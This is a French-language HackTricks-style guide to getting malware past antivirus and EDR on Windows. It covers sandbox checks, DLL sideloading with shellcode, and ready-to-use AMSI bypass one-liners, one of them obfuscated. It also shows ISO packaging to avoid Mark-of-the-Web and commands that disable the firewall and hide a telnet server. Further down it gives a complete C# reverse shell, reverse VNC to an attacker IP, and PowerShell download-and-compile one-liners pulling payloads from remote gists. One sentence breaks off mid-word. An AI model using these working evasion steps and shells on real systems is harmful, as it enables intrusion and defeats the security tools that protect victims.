# Bypass Antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Cette page a été écrite par** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## **Méthodologie d'évasion AV**

Actuellement, les AV utilisent différentes méthodes pour vérifier si un fichier est malveillant ou non, détection statique, analyse dynamique, et pour les EDR plus avancés, analyse comportementale.

### **Détection statique**

La détection statique est réalisée en signalant des chaînes ou des tableaux d'octets malveillants connus dans un binaire ou un script, et en extrayant également des informations du fichier lui-même (par exemple, description du fichier, nom de l'entreprise, signatures numériques, icône, somme de contrôle, etc.). Cela signifie que l'utilisation d'outils publics connus peut vous faire attraper plus facilement, car ils ont probablement été analysés et signalés comme malveillants. Il existe quelques moyens de contourner ce type de détection :

- **Chiffrement**

Si vous chiffrez le binaire, il n'y aura aucun moyen pour l'AV de détecter votre programme, mais vous aurez besoin d'un chargeur pour déchiffrer et exécuter le programme en mémoire.

- **Obfuscation**

Parfois, tout ce que vous devez faire est de changer certaines chaînes dans votre binaire ou script pour le faire passer l'AV, mais cela peut être une tâche chronophage selon ce que vous essayez d'obfusquer.

- **Outils personnalisés**

Si vous développez vos propres outils, il n'y aura pas de signatures malveillantes connues, mais cela demande beaucoup de temps et d'efforts.

> [!NOTE]
> Un bon moyen de vérifier la détection statique de Windows Defender est [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Il divise essentiellement le fichier en plusieurs segments et demande ensuite à Defender de scanner chacun individuellement, de cette manière, il peut vous dire exactement quelles sont les chaînes ou octets signalés dans votre binaire.

Je vous recommande vivement de consulter cette [playlist YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sur l'évasion AV pratique.

### **Analyse dynamique**

L'analyse dynamique est lorsque l'AV exécute votre binaire dans un bac à sable et surveille les activités malveillantes (par exemple, essayer de déchiffrer et de lire les mots de passe de votre navigateur, effectuer un minidump sur LSASS, etc.). Cette partie peut être un peu plus délicate à gérer, mais voici quelques choses que vous pouvez faire pour échapper aux bacs à sable.

- **Dormir avant l'exécution** En fonction de la manière dont c'est implémenté, cela peut être un excellent moyen de contourner l'analyse dynamique de l'AV. Les AV ont un temps très court pour scanner les fichiers afin de ne pas interrompre le flux de travail de l'utilisateur, donc utiliser de longs temps de sommeil peut perturber l'analyse des binaires. Le problème est que de nombreux bacs à sable d'AV peuvent simplement ignorer le sommeil en fonction de la manière dont c'est implémenté.
- **Vérification des ressources de la machine** En général, les bacs à sable ont très peu de ressources à utiliser (par exemple, < 2 Go de RAM), sinon ils pourraient ralentir la machine de l'utilisateur. Vous pouvez également être très créatif ici, par exemple en vérifiant la température du CPU ou même les vitesses des ventilateurs, tout ne sera pas implémenté dans le bac à sable.
- **Vérifications spécifiques à la machine** Si vous souhaitez cibler un utilisateur dont le poste de travail est joint au domaine "contoso.local", vous pouvez effectuer une vérification sur le domaine de l'ordinateur pour voir s'il correspond à celui que vous avez spécifié, si ce n'est pas le cas, vous pouvez faire quitter votre programme.

Il s'avère que le nom de l'ordinateur du bac à sable de Microsoft Defender est HAL9TH, donc, vous pouvez vérifier le nom de l'ordinateur dans votre malware avant la détonation, si le nom correspond à HAL9TH, cela signifie que vous êtes dans le bac à sable de Defender, donc vous pouvez faire quitter votre programme.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source : <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

D'autres très bons conseils de [@mgeeky](https://twitter.com/mariuszbit) pour contrer les bacs à sable

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Comme nous l'avons dit précédemment dans ce post, **les outils publics** seront finalement **détectés**, donc, vous devriez vous poser une question :

Par exemple, si vous voulez dumper LSASS, **avez-vous vraiment besoin d'utiliser mimikatz** ? Ou pourriez-vous utiliser un projet différent qui est moins connu et qui dumpe également LSASS.

La bonne réponse est probablement la dernière. Prenant mimikatz comme exemple, c'est probablement l'un des, sinon le plus signalé morceau de malware par les AV et EDR, tandis que le projet lui-même est super cool, c'est aussi un cauchemar de travailler avec pour contourner les AV, donc cherchez simplement des alternatives pour ce que vous essayez d'accomplir.

> [!NOTE]
> Lorsque vous modifiez vos charges utiles pour l'évasion, assurez-vous de **désactiver la soumission automatique d'échantillons** dans Defender, et s'il vous plaît, sérieusement, **NE TÉLÉCHARGEZ PAS SUR VIRUSTOTAL** si votre objectif est d'atteindre l'évasion à long terme. Si vous voulez vérifier si votre charge utile est détectée par un AV particulier, installez-le sur une VM, essayez de désactiver la soumission automatique d'échantillons, et testez-le là-bas jusqu'à ce que vous soyez satisfait du résultat.

## EXEs vs DLLs

Chaque fois que c'est possible, **priorisez toujours l'utilisation de DLLs pour l'évasion**, d'après mon expérience, les fichiers DLL sont généralement **beaucoup moins détectés** et analysés, donc c'est une astuce très simple à utiliser pour éviter la détection dans certains cas (si votre charge utile a un moyen de s'exécuter en tant que DLL bien sûr).

Comme nous pouvons le voir dans cette image, une charge utile DLL de Havoc a un taux de détection de 4/26 sur antiscan.me, tandis que la charge utile EXE a un taux de détection de 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>comparaison antiscan.me d'une charge utile EXE normale de Havoc vs une DLL normale de Havoc</p></figcaption></figure>

Maintenant, nous allons montrer quelques astuces que vous pouvez utiliser avec des fichiers DLL pour être beaucoup plus furtif.

## Chargement latéral de DLL & Proxying

**Le chargement latéral de DLL** tire parti de l'ordre de recherche de DLL utilisé par le chargeur en positionnant à la fois l'application victime et la ou les charges utiles malveillantes côte à côte.

Vous pouvez vérifier les programmes susceptibles de chargement latéral de DLL en utilisant [Siofra](https://github.com/Cybereason/siofra) et le script PowerShell suivant :
```powershell
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Cette commande affichera la liste des programmes susceptibles de DLL hijacking dans "C:\Program Files\\" et les fichiers DLL qu'ils essaient de charger.

Je vous recommande fortement de **explorer vous-même les programmes DLL Hijackable/Sideloadable**, cette technique est assez discrète si elle est bien réalisée, mais si vous utilisez des programmes DLL Sideloadable connus publiquement, vous risquez d'être facilement attrapé.

Il ne suffit pas de placer une DLL malveillante avec le nom qu'un programme s'attend à charger, cela ne chargera pas votre payload, car le programme s'attend à certaines fonctions spécifiques à l'intérieur de cette DLL. Pour résoudre ce problème, nous utiliserons une autre technique appelée **DLL Proxying/Forwarding**.

**DLL Proxying** redirige les appels qu'un programme fait depuis la DLL proxy (et malveillante) vers la DLL originale, préservant ainsi la fonctionnalité du programme et permettant de gérer l'exécution de votre payload.

Je vais utiliser le projet [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) de [@flangvik](https://twitter.com/Flangvik/)

Voici les étapes que j'ai suivies :
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
La dernière commande nous donnera 2 fichiers : un modèle de code source DLL et la DLL renommée originale.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Ces résultats sont :

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Notre shellcode (codé avec [SGN](https://github.com/EgeBalci/sgn)) et la DLL proxy ont un taux de détection de 0/26 sur [antiscan.me](https://antiscan.me) ! Je qualifierais cela de succès.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> Je **recommande fortement** de regarder le [VOD twitch de S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) sur le DLL Sideloading et aussi la [vidéo d'ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE) pour en apprendre davantage sur ce que nous avons discuté plus en profondeur.

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze est un kit d'outils de payload pour contourner les EDR en utilisant des processus suspendus, des appels système directs et des méthodes d'exécution alternatives`

Vous pouvez utiliser Freeze pour charger et exécuter votre shellcode de manière furtive.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> L'évasion est juste un jeu de chat et de souris, ce qui fonctionne aujourd'hui pourrait être détecté demain, donc ne comptez jamais sur un seul outil, si possible, essayez de combiner plusieurs techniques d'évasion.

## AMSI (Interface de Scan Anti-Malware)

AMSI a été créé pour prévenir les "[malwares sans fichier](https://en.wikipedia.org/wiki/Fileless_malware)". Au départ, les AV n'étaient capables de scanner que les **fichiers sur disque**, donc si vous pouviez d'une manière ou d'une autre exécuter des charges utiles **directement en mémoire**, l'AV ne pouvait rien faire pour l'empêcher, car il n'avait pas assez de visibilité.

La fonctionnalité AMSI est intégrée dans ces composants de Windows.

- Contrôle de Compte Utilisateur, ou UAC (élévation d'EXE, COM, MSI, ou installation ActiveX)
- PowerShell (scripts, utilisation interactive et évaluation de code dynamique)
- Windows Script Host (wscript.exe et cscript.exe)
- JavaScript et VBScript
- Macros VBA Office

Elle permet aux solutions antivirus d'inspecter le comportement des scripts en exposant le contenu des scripts sous une forme à la fois non chiffrée et non obfusquée.

L'exécution de `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` produira l'alerte suivante sur Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Remarquez comment il préfixe `amsi:` puis le chemin vers l'exécutable à partir duquel le script a été exécuté, dans ce cas, powershell.exe

Nous n'avons pas déposé de fichier sur le disque, mais nous avons quand même été pris en mémoire à cause d'AMSI.

Il existe plusieurs façons de contourner AMSI :

- **Obfuscation**

Puisqu'AMSI fonctionne principalement avec des détections statiques, modifier les scripts que vous essayez de charger peut être un bon moyen d'échapper à la détection.

Cependant, AMSI a la capacité de déobfusquer les scripts même s'ils ont plusieurs couches, donc l'obfuscation pourrait être une mauvaise option selon la manière dont elle est réalisée. Cela rend l'évasion pas si simple. Bien que, parfois, tout ce que vous devez faire est de changer quelques noms de variables et vous serez bon, donc cela dépend de combien quelque chose a été signalé.

- **Bypass AMSI**

Puisqu'AMSI est implémenté en chargeant une DLL dans le processus powershell (également cscript.exe, wscript.exe, etc.), il est possible de le manipuler facilement même en étant un utilisateur non privilégié. En raison de ce défaut dans l'implémentation d'AMSI, les chercheurs ont trouvé plusieurs façons d'échapper au scan AMSI.

**Forcer une Erreur**

Forcer l'initialisation d'AMSI à échouer (amsiInitFailed) entraînera qu'aucun scan ne sera initié pour le processus actuel. À l'origine, cela a été divulgué par [Matt Graeber](https://twitter.com/mattifestation) et Microsoft a développé une signature pour prévenir une utilisation plus large.
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Il a suffi d'une ligne de code PowerShell pour rendre AMSI inutilisable pour le processus PowerShell actuel. Cette ligne a bien sûr été signalée par AMSI lui-même, donc quelques modifications sont nécessaires pour utiliser cette technique.

Voici un contournement AMSI modifié que j'ai pris de ce [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```powershell
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Gardez à l'esprit que cela sera probablement signalé une fois que ce post sera publié, donc vous ne devriez pas publier de code si votre plan est de rester indétecté.

**Memory Patching**

Cette technique a été initialement découverte par [@RastaMouse](https://twitter.com/_RastaMouse/) et consiste à trouver l'adresse de la fonction "AmsiScanBuffer" dans amsi.dll (responsable de l'analyse de l'entrée fournie par l'utilisateur) et à la remplacer par des instructions pour retourner le code pour E_INVALIDARG, de cette manière, le résultat de l'analyse réelle retournera 0, ce qui est interprété comme un résultat propre.

> [!NOTE]
> Veuillez lire [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) pour une explication plus détaillée.

Il existe également de nombreuses autres techniques utilisées pour contourner AMSI avec PowerShell, consultez [**cette page**](basic-powershell-for-pentesters/#amsi-bypass) et [ce repo](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) pour en savoir plus à leur sujet.

Ou ce script qui, via le patching mémoire, patchera chaque nouveau Powersh

## Obfuscation

Il existe plusieurs outils qui peuvent être utilisés pour **obfusquer le code C# en texte clair**, générer des **modèles de métaprogrammation** pour compiler des binaires ou **obfusquer des binaires compilés** tels que :

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: obfuscateur C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): L'objectif de ce projet est de fournir un fork open-source de la suite de compilation [LLVM](http://www.llvm.org/) capable d'offrir une sécurité logicielle accrue grâce à [l'obfuscation de code](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) et à la protection contre la falsification.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator démontre comment utiliser le langage `C++11/14` pour générer, au moment de la compilation, du code obfusqué sans utiliser d'outil externe et sans modifier le compilateur.
- [**obfy**](https://github.com/fritzone/obfy): Ajoute une couche d'opérations obfusquées générées par le cadre de métaprogrammation de modèles C++ qui rendra la vie de la personne souhaitant cracker l'application un peu plus difficile.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz est un obfuscateur binaire x64 capable d'obfusquer divers fichiers pe différents, y compris : .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame est un moteur de code métamorphique simple pour des exécutables arbitraires.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator est un cadre d'obfuscation de code à grain fin pour les langages pris en charge par LLVM utilisant ROP (programmation orientée retour). ROPfuscator obfusque un programme au niveau du code assembleur en transformant des instructions régulières en chaînes ROP, contrecarrant notre conception naturelle du flux de contrôle normal.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt est un Crypter PE .NET écrit en Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor est capable de convertir des EXE/DLL existants en shellcode et de les charger ensuite.

## SmartScreen & MoTW

Vous avez peut-être vu cet écran lors du téléchargement de certains exécutables depuis Internet et de leur exécution.

Microsoft Defender SmartScreen est un mécanisme de sécurité destiné à protéger l'utilisateur final contre l'exécution d'applications potentiellement malveillantes.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen fonctionne principalement avec une approche basée sur la réputation, ce qui signifie que les applications téléchargées de manière peu courante déclencheront SmartScreen, alertant ainsi et empêchant l'utilisateur final d'exécuter le fichier (bien que le fichier puisse toujours être exécuté en cliquant sur Plus d'infos -> Exécuter quand même).

**MoTW** (Mark of The Web) est un [flux de données alternatif NTFS](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) avec le nom de Zone.Identifier qui est automatiquement créé lors du téléchargement de fichiers depuis Internet, avec l'URL depuis laquelle il a été téléchargé.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Vérification du flux de données Zone.Identifier pour un fichier téléchargé depuis Internet.</p></figcaption></figure>

> [!NOTE]
> Il est important de noter que les exécutables signés avec un certificat de signature **de confiance** **ne déclencheront pas SmartScreen**.

Une manière très efficace d'empêcher vos charges utiles d'obtenir le Mark of The Web est de les emballer dans une sorte de conteneur comme un ISO. Cela se produit parce que le Mark-of-the-Web (MOTW) **ne peut pas** être appliqué aux volumes **non NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) est un outil qui emballe les charges utiles dans des conteneurs de sortie pour éviter le Mark-of-the-Web.

Exemple d'utilisation :
```powershell
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Voici une démonstration pour contourner SmartScreen en emballant des charges utiles à l'intérieur de fichiers ISO en utilisant [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## Réflexion sur les Assemblies C#

Charger des binaires C# en mémoire est connu depuis un certain temps et c'est toujours un excellent moyen d'exécuter vos outils de post-exploitation sans se faire attraper par l'AV.

Puisque la charge utile sera chargée directement en mémoire sans toucher au disque, nous devrons seulement nous soucier de patcher l'AMSI pour l'ensemble du processus.

La plupart des frameworks C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) offrent déjà la possibilité d'exécuter des assemblies C# directement en mémoire, mais il existe différentes manières de le faire :

- **Fork\&Run**

Cela implique **de créer un nouveau processus sacrificiel**, d'injecter votre code malveillant de post-exploitation dans ce nouveau processus, d'exécuter votre code malveillant et, une fois terminé, de tuer le nouveau processus. Cela a à la fois ses avantages et ses inconvénients. L'avantage de la méthode fork and run est que l'exécution se produit **en dehors** de notre processus d'implant Beacon. Cela signifie que si quelque chose dans notre action de post-exploitation tourne mal ou se fait attraper, il y a une **bien plus grande chance** que notre **implant survive.** L'inconvénient est que vous avez une **plus grande chance** de vous faire attraper par les **Détections Comportementales**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Il s'agit d'injecter le code malveillant de post-exploitation **dans son propre processus**. De cette façon, vous pouvez éviter de créer un nouveau processus et de le faire scanner par l'AV, mais l'inconvénient est que si quelque chose tourne mal avec l'exécution de votre charge utile, il y a une **bien plus grande chance** de **perdre votre beacon** car il pourrait planter.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> Si vous souhaitez en savoir plus sur le chargement des Assemblies C#, veuillez consulter cet article [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) et leur BOF InlineExecute-Assembly ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Vous pouvez également charger des Assemblies C# **depuis PowerShell**, consultez [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) et la vidéo de [S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Utilisation d'autres langages de programmation

Comme proposé dans [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), il est possible d'exécuter du code malveillant en utilisant d'autres langages en donnant à la machine compromise un accès **à l'environnement d'interpréteur installé sur le partage SMB contrôlé par l'attaquant**.

En permettant l'accès aux binaires de l'interpréteur et à l'environnement sur le partage SMB, vous pouvez **exécuter du code arbitraire dans ces langages dans la mémoire** de la machine compromise.

Le dépôt indique : Defender scanne toujours les scripts mais en utilisant Go, Java, PHP, etc., nous avons **plus de flexibilité pour contourner les signatures statiques**. Les tests avec des scripts de shell inversé aléatoires non obfusqués dans ces langages se sont révélés fructueux.

## Évasion avancée

L'évasion est un sujet très compliqué, parfois vous devez prendre en compte de nombreuses sources de télémétrie dans un seul système, donc il est pratiquement impossible de rester complètement indétecté dans des environnements matures.

Chaque environnement contre lequel vous vous battez aura ses propres forces et faiblesses.

Je vous encourage vivement à regarder cette présentation de [@ATTL4S](https://twitter.com/DaniLJ94), pour avoir un aperçu des techniques d'évasion plus avancées.

{% embed url="https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo" %}

C'est aussi une autre excellente présentation de [@mariuszbit](https://twitter.com/mariuszbit) sur l'évasion en profondeur.

{% embed url="https://www.youtube.com/watch?v=IbA7Ung39o4" %}

## **Anciennes techniques**

### **Vérifiez quelles parties Defender trouve comme malveillantes**

Vous pouvez utiliser [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) qui **supprimera des parties du binaire** jusqu'à ce qu'il **découvre quelle partie Defender** trouve comme malveillante et vous le sépare.\
Un autre outil faisant **la même chose est** [**avred**](https://github.com/dobin/avred) avec un service web ouvert offrant le service à [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Serveur Telnet**

Jusqu'à Windows 10, tous les Windows étaient livrés avec un **serveur Telnet** que vous pouviez installer (en tant qu'administrateur) en faisant :
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Faites-le **démarrer** lorsque le système est démarré et **exécutez**-le maintenant :
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Changer le port telnet** (furtif) et désactiver le pare-feu :
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Téléchargez-le depuis : [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (vous voulez les téléchargements binaires, pas l'installation)

**SUR L'HÔTE** : Exécutez _**winvnc.exe**_ et configurez le serveur :

- Activez l'option _Désactiver TrayIcon_
- Définissez un mot de passe dans _VNC Password_
- Définissez un mot de passe dans _View-Only Password_

Ensuite, déplacez le binaire _**winvnc.exe**_ et le fichier **nouvellement** créé _**UltraVNC.ini**_ à l'intérieur de la **victime**

#### **Connexion inversée**

L'**attaquant** doit **exécuter à l'intérieur** de son **hôte** le binaire `vncviewer.exe -listen 5900` afin qu'il soit **préparé** à attraper une **connexion VNC inversée**. Ensuite, à l'intérieur de la **victime** : Démarrez le démon winvnc `winvnc.exe -run` et exécutez `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**AVERTISSEMENT :** Pour maintenir la discrétion, vous ne devez pas faire quelques choses

- Ne démarrez pas `winvnc` s'il est déjà en cours d'exécution ou vous déclencherez un [popup](https://i.imgur.com/1SROTTl.png). vérifiez s'il est en cours d'exécution avec `tasklist | findstr winvnc`
- Ne démarrez pas `winvnc` sans `UltraVNC.ini` dans le même répertoire ou cela ouvrira [la fenêtre de configuration](https://i.imgur.com/rfMQWcf.png)
- Ne lancez pas `winvnc -h` pour obtenir de l'aide ou vous déclencherez un [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Téléchargez-le depuis : [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
À l'intérieur de GreatSCT :
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Maintenant, **démarrez le lister** avec `msfconsole -r file.rc` et **exécutez** le **payload xml** avec :
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Le défenseur actuel terminera le processus très rapidement.**

### Compiler notre propre reverse shell

https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Premier C# Revershell

Compilez-le avec :
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Utilisez-le avec :
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# utilisant le compilateur
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
Téléchargement et exécution automatiques :
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{% embed url="https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f" %}

Liste des obfuscateurs C# : [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Utiliser python pour construire des injecteurs exemple :

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

